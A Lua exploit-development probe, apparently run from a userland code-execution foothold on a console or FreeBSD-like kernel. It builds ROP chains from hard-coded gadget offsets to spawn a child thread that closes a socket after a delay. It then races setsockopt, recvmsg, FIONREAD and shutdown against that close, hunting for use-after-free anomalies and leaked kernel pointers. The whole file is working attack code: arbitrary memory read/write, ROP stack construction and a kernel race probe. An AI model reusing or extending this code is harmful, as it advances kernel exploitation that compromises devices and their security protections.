-- CRASH_CLASS: MODERATE
-- PROBE 93e9: socket close race with delayed child close
--
-- 93e8 showed the child closes BEFORE the main thread enters the syscall.
-- This probe delays the child's close with busy-work syscalls (getpid loop)
-- so the close happens DURING the main thread's socket operation.
-- Tests setsockopt, recvmsg, shutdown vs delayed close.
-- 20 iterations per section to increase race probability.

print("=== PROBE 93e9: CLOSE RACE DELAYED ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function split(val)
    if val == nil then return 0, 0 end
    if type(val) == "number" then
        if val < 0 then val = val + 0x100000000 end
        if val >= 0x100000000 then
            local hi = math.floor(val / 0x100000000)
            return val - hi * 0x100000000, hi
        end
        return val, 0
    end
    if type(val) == "table" and val.h then
        local h, l = val.h, val.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return l, h
    end
    return 0, 0
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local sa = memory.alloc(32); wq(N(sa), uint64(1))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

local ib = memory.alloc(0x200); wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local function eoff(off)
    local lo = elo + off; local hi = ehi
    if lo >= 0x100000000 then hi = hi + 1; lo = lo - 0x100000000 end
    return lo, hi
end

local par_lo, par_hi = eoff(0x992)
local pdr_lo, pdr_hi = eoff(0xC9DFE)
local psr_lo, psr_hi = eoff(0xD77D)
local prdx_lo, prdx_hi = eoff(0x3B02D7)
local prc_lo, prc_hi = eoff(0xE64)
local pr8_lo, pr8_hi = eoff(0x991)
local bret_lo, bret_hi = eoff(0x42)
local mwr_lo, mwr_hi = eoff(0x92C67)
local stub_lo, stub_hi = split(stub)

local function spawn_child(calls, done_addr)
    local tcb = memory.alloc(0x1000)
    local tcb_a = N(tcb); local tcb_lo, tcb_hi = split(tcb)
    for i = 0, 0xFF8, 8 do wd(tcb_a + i, tcb_lo); wd(tcb_a + i + 4, tcb_hi) end
    local fs_ptr = memory.alloc(8)
    wd(N(fs_ptr), tcb_lo); wd(N(fs_ptr) + 4, tcb_hi)
    local fsptr_lo, fsptr_hi = split(N(fs_ptr))
    local done_lo, done_hi = split(done_addr)
    local stk = memory.alloc(0x200000)
    local sb = N(stk); local ss = 0x100000
    local rsp = sb + ss - ((sb + ss) % 16) - 8
    local pos = 0
    local function put(lo, hi) wd(rsp + pos*8, lo); wd(rsp + pos*8 + 4, hi or 0); pos = pos + 1 end
    put(pdr_lo, pdr_hi); put(129, 0)
    put(psr_lo, psr_hi); put(fsptr_lo, fsptr_hi)
    put(par_lo, par_hi); put(165, 0)
    put(stub_lo, stub_hi)
    for _, c in ipairs(calls) do
        if #c >= 2 then put(pdr_lo, pdr_hi); local l,h = split(c[2]); put(l, h) end
        if #c >= 3 then put(psr_lo, psr_hi); local l,h = split(c[3]); put(l, h) end
        if #c >= 4 then put(prdx_lo, prdx_hi); local l,h = split(c[4]); put(l, h) end
        if #c >= 5 then put(prc_lo, prc_hi); local l,h = split(c[5]); put(l, h) end
        if #c >= 6 then put(pr8_lo, pr8_hi); local l,h = split(c[6]); put(l, h) end
        put(par_lo, par_hi); put(c[1], 0)
        put(stub_lo, stub_hi)
    end
    put(par_lo, par_hi); put(0xD09E93E9, 0)
    put(pdr_lo, pdr_hi); put(done_lo, done_hi)
    put(mwr_lo, mwr_hi)
    put(pdr_lo, pdr_hi); put(0, 0)
    put(par_lo, par_hi); put(431, 0)
    put(stub_lo, stub_hi)
    local par = memory.alloc(0x40); local pa = N(par)
    for i = 0, 0x3C, 4 do wd(pa + i, 0) end
    wq(pa, uint64(string.format("0x%X%08X", bret_hi, bret_lo)))
    wq(pa + 8, uint64(0))
    wq(pa + 0x10, uint64(sb)); wq(pa + 0x18, uint64(ss))
    local tid = memory.alloc(8); wq(N(tid), uint64(0))
    wq(pa + 0x30, tid)
    local ok1, rv1 = pcall(function() return mk(455)(par, uint64(0x38)) end)
    return ok1 and N(rv1) == 0
end

local function wait_done(done, ms)
    for w = 1, ms * 10 do if (rd(N(done)) or 0) ~= 0 then return true end end
    return false
end

local function make_pair()
    local sv = memory.alloc(16); wd(N(sv), 0); wd(N(sv)+4, 0)
    pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), sv) end)
    return rd(N(sv)) or -1, rd(N(sv)+4) or -1
end

print("setup done")

-- Build a delay chain: N getpid calls before the close
-- This gives the main thread time to enter its syscall
local function make_delay_then_close(fd, ndelay)
    local calls = {}
    for i = 1, ndelay do
        table.insert(calls, {20})  -- getpid as delay
    end
    table.insert(calls, {6, fd})  -- close(fd)
    return calls
end

local anomalies = 0

-- ====== TEST A: setsockopt SO_SNDBUF vs delayed close ======
print("--- A: setsockopt vs delayed close ---")
for iter = 1, 20 do
    if not alive() then print("DEAD_A"); break end
    local fd0, fd1 = make_pair()
    if fd0 < 0 then print("NOPAIR"); break end

    local done = memory.alloc(8); wd(N(done), 0)
    -- Delay 5 getpid calls before close
    local ok = spawn_child(make_delay_then_close(fd0, 5), N(done))
    if not ok then pcall(function() mk(6)(uint64(fd0)) end); pcall(function() mk(6)(uint64(fd1)) end); break end

    local optval = memory.alloc(8); wd(N(optval), 65536)
    local ok_s, rv_s = pcall(function()
        return mk(105)(uint64(fd0), uint64(0xFFFF), uint64(0x1001), uint64(N(optval)), uint64(4))
    end)
    local s_ret = ok_s and N(rv_s) or -999
    if s_ret >= 0x80000000 then s_ret = s_ret - 0x100000000 end
    wait_done(done, 5000)

    if s_ret == 0 then
        print(string.format("  A_%d: ret=0 (WON RACE)", iter))
        anomalies = anomalies + 1
    end
    pcall(function() mk(6)(uint64(fd0)) end)
    pcall(function() mk(6)(uint64(fd1)) end)
end

-- ====== TEST B: recvmsg MSG_PEEK on socket with data vs delayed close ======
print("")
print("--- B: recvmsg vs delayed close ---")
for iter = 1, 20 do
    if not alive() then print("DEAD_B"); break end
    local fd0, fd1 = make_pair()
    if fd0 < 0 then print("NOPAIR"); break end

    local wbuf = memory.alloc(32)
    for j = 0, 28, 4 do wd(N(wbuf)+j, 0xAA000000+iter) end
    pcall(function() mk(4)(uint64(fd0), uint64(N(wbuf)), uint64(32)) end)

    local done = memory.alloc(8); wd(N(done), 0)
    local ok = spawn_child(make_delay_then_close(fd1, 5), N(done))
    if not ok then pcall(function() mk(6)(uint64(fd0)) end); pcall(function() mk(6)(uint64(fd1)) end); break end

    local rbuf = memory.alloc(64)
    for j = 0, 60, 4 do wd(N(rbuf)+j, 0xDEAD0000+j) end
    local iov = memory.alloc(16)
    wq(N(iov), uint64(N(rbuf))); wq(N(iov)+8, uint64(64))
    local msg = memory.alloc(64)
    for j = 0, 60, 4 do wd(N(msg)+j, 0) end
    wq(N(msg)+0x10, uint64(N(iov))); wq(N(msg)+0x18, uint64(1))

    local ok_r, rv_r = pcall(function()
        return mk(27)(uint64(fd1), uint64(N(msg)), uint64(2))
    end)
    local r_ret = ok_r and N(rv_r) or -999
    if r_ret >= 0x80000000 then r_ret = r_ret - 0x100000000 end
    wait_done(done, 5000)

    if r_ret > 0 then
        print(string.format("  B_%d: ret=%d (GOT DATA)", iter, r_ret))
        for j = 0, math.min(r_ret-1, 56), 4 do
            local lo = rd(N(rbuf)+j) or 0
            local hi = rd(N(rbuf)+j+4) or 0
            if lo < 0 then lo = lo + 0x100000000 end
            if hi < 0 then hi = hi + 0x100000000 end
            if hi >= 0xFFFF8000 and hi < 0xFFFFFF00 then
                print(string.format("  B_%d +%02X: KPTR 0x%08X%08X", iter, j, hi, lo))
                anomalies = anomalies + 1
            end
        end
    end
    pcall(function() mk(6)(uint64(fd0)) end)
    pcall(function() mk(6)(uint64(fd1)) end)
end

-- ====== TEST C: ioctl FIONREAD vs delayed close ======
print("")
print("--- C: FIONREAD vs delayed close ---")
for iter = 1, 20 do
    if not alive() then print("DEAD_C"); break end
    local fd0, fd1 = make_pair()
    if fd0 < 0 then print("NOPAIR"); break end

    local wbuf = memory.alloc(64)
    for j = 0, 60, 4 do wd(N(wbuf)+j, 0xEE000000+iter) end
    pcall(function() mk(4)(uint64(fd0), uint64(N(wbuf)), uint64(64)) end)

    local done = memory.alloc(8); wd(N(done), 0)
    local ok = spawn_child(make_delay_then_close(fd1, 5), N(done))
    if not ok then pcall(function() mk(6)(uint64(fd0)) end); pcall(function() mk(6)(uint64(fd1)) end); break end

    local nbytes = memory.alloc(8); wd(N(nbytes), 0xDEADDEAD)
    local ok_i, rv_i = pcall(function()
        return mk(54)(uint64(fd1), uint64(0x4004667F), uint64(N(nbytes)))
    end)
    local i_ret = ok_i and N(rv_i) or -999
    if i_ret >= 0x80000000 then i_ret = i_ret - 0x100000000 end
    wait_done(done, 5000)

    local nb_val = rd(N(nbytes)) or 0
    if nb_val < 0 then nb_val = nb_val + 0x100000000 end
    if i_ret == 0 and nb_val > 0x10000 then
        print(string.format("  C_%d: LARGE FIONREAD 0x%08X", iter, nb_val))
        anomalies = anomalies + 1
    end
    pcall(function() mk(6)(uint64(fd0)) end)
    pcall(function() mk(6)(uint64(fd1)) end)
end

-- ====== TEST D: shutdown vs delayed close ======
print("")
print("--- D: shutdown vs delayed close ---")
for iter = 1, 20 do
    if not alive() then print("DEAD_D"); break end
    local fd0, fd1 = make_pair()
    if fd0 < 0 then print("NOPAIR"); break end

    local done = memory.alloc(8); wd(N(done), 0)
    local ok = spawn_child(make_delay_then_close(fd0, 5), N(done))
    if not ok then pcall(function() mk(6)(uint64(fd0)) end); pcall(function() mk(6)(uint64(fd1)) end); break end

    local ok_h, rv_h = pcall(function()
        return mk(134)(uint64(fd0), uint64(2))
    end)
    local h_ret = ok_h and N(rv_h) or -999
    if h_ret >= 0x80000000 then h_ret = h_ret - 0x100000000 end
    wait_done(done, 5000)

    if h_ret == 0 then
        print(string.format("  D_%d: ret=0 (WON RACE)", iter))
        anomalies = anomalies + 1
    end
    pcall(function() mk(6)(uint64(fd0)) end)
    pcall(function() mk(6)(uint64(fd1)) end)
end

print("")
print(string.format("anomalies=%d", anomalies))
print("alive=" .. tostring(alive()))
print("=== 93e9 COMPLETE ===")
